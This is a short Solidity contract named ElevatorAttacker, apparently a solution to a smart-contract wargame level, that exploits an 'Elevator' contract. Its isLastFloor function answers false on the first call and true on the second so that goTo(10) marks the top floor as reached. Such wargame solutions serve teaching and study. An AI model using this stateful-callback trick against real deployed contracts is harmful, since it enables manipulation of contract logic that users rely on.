// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.18;

/**
 * @title Elevator Attacker
 * @dev This contract is used to attack the Elevator contract
 */
contract ElevatorAttacker {
    Elevator elevator;
    bool alreadyCalled;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function goToTopFloor() external {
        elevator.goTo(10);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (alreadyCalled) {
            return true;
        } else {
            alreadyCalled = true;
            return false;
        }
    }
}

interface Elevator {
    function goTo(uint256 _floor) external;
}
